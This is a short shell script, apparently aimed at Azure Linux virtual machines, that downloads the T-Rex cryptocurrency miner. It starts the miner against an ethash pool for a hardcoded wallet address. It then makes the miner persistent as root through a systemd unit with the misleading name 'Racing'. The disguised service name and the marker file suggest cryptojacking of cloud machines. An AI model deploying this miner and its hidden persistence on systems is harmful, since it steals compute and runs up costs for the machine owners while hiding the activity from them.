woker=$(date +'%d%m_%H%M%S_')
name=ML
woker+=$name
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
echo "xxx vip pro" > isHaveSetupCoin.txt
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
sudo killall XXX
./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w $woker &

sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w 0000mlscript\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
